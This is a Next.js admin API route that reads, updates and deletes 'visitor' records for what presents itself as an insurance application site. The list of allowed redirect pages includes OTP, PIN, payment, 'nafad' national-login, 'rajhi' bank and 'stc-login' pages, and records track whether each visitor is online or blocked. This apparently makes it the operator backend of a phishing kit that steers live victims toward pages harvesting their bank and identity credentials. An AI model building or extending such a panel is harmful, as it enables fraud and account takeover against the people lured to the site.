import { NextRequest, NextResponse } from "next/server";

import { authorizationResponse, requireAdmin } from "@/lib/server/auth";
import {
  deleteVisitorRecords,
  getVisitorRecord,
  mapVisitorRow,
  updateVisitorRecord,
} from "@/lib/server/visitor-data";
import type { InsuranceApplication } from "@/lib/firestore-types";

const allowedRedirectPages = new Set([
  "home",
  "home-new",
  "main",
  "insur",
  "compar",
  "check",
  "payment",
  "veri",
  "confi",
  "otp",
  "pin",
  "phone",
  "phone-info",
  "nafad",
  "nafad_modal",
  "rajhi",
  "stc-login",
  "finalOtp",
]);

const protectedKeys = new Set([
  "id",
  "createdAt",
  "updatedAt",
  "data",
  "visitor_id",
  "is_online",
  "is_blocked",
  "is_unread",
  "current_page",
  "current_step",
  "redirect_page",
]);

const validStatuses = new Set([
  "draft",
  "pending_review",
  "approved",
  "rejected",
  "completed",
]);

async function getId(context: { params: Promise<{ id: string }> }) {
  const { id } = await context.params;
  if (!/^[a-zA-Z0-9_-]{1,200}$/.test(id)) {
    throw new Response("Invalid visitor ID", { status: 400 });
  }
  return id;
}

function validateUpdates(value: unknown): Partial<InsuranceApplication> {
  if (!value || typeof value !== "object" || Array.isArray(value)) {
    throw new Response("Request body must be an object", { status: 400 });
  }

  const body = value as Record<string, unknown>;
  if (Object.keys(body).some((key) => protectedKeys.has(key))) {
    throw new Response("Protected database fields cannot be updated", { status: 400 });
  }
  if (Object.keys(body).length === 0 || Object.keys(body).length > 40) {
    throw new Response("Invalid update payload", { status: 400 });
  }

  if (body.status !== undefined && !validStatuses.has(String(body.status))) {
    throw new Response("Invalid application status", { status: 400 });
  }
  if (
    body.redirectPage !== undefined &&
    (typeof body.redirectPage !== "string" ||
      !allowedRedirectPages.has(body.redirectPage))
  ) {
    throw new Response("Invalid redirect page", { status: 400 });
  }
  for (const key of ["isBlocked", "isUnread", "isOnline"]) {
    if (body[key] !== undefined && typeof body[key] !== "boolean") {
      throw new Response(`Invalid ${key} value`, { status: 400 });
    }
  }
  if (
    body.notes !== undefined &&
    (typeof body.notes !== "string" || body.notes.length > 2000)
  ) {
    throw new Response("Invalid notes value", { status: 400 });
  }

  return body as Partial<InsuranceApplication>;
}

export async function GET(
  _request: NextRequest,
  context: { params: Promise<{ id: string }> },
) {
  try {
    await requireAdmin();
    const id = await getId(context);
    const row = await getVisitorRecord(id);
    return row
      ? NextResponse.json({ data: mapVisitorRow(row) })
      : NextResponse.json({ error: "Visitor not found" }, { status: 404 });
  } catch (error) {
    if (error instanceof Response) return error;
    if (error instanceof Error && "status" in error) return authorizationResponse(error);
    console.error("Visitor lookup failed:", error);
    return NextResponse.json({ error: "Unable to load visitor record" }, { status: 500 });
  }
}

export async function PATCH(
  request: NextRequest,
  context: { params: Promise<{ id: string }> },
) {
  try {
    await requireAdmin();
    const id = await getId(context);
    const updates = validateUpdates(await request.json());
    const updated = await updateVisitorRecord(id, updates);
    return updated
      ? NextResponse.json({ success: true })
      : NextResponse.json({ error: "Visitor not found" }, { status: 404 });
  } catch (error) {
    if (error instanceof Response) return error;
    if (error instanceof Error && "status" in error) return authorizationResponse(error);
    console.error("Visitor update failed:", error);
    return NextResponse.json({ error: "Unable to update visitor record" }, { status: 500 });
  }
}

export async function DELETE(
  _request: NextRequest,
  context: { params: Promise<{ id: string }> },
) {
  try {
    await requireAdmin();
    const id = await getId(context);
    await deleteVisitorRecords([id]);
    return NextResponse.json({ success: true });
  } catch (error) {
    if (error instanceof Response) return error;
    if (error instanceof Error && "status" in error) return authorizationResponse(error);
    console.error("Visitor deletion failed:", error);
    return NextResponse.json({ error: "Unable to delete visitor record" }, { status: 500 });
  }
}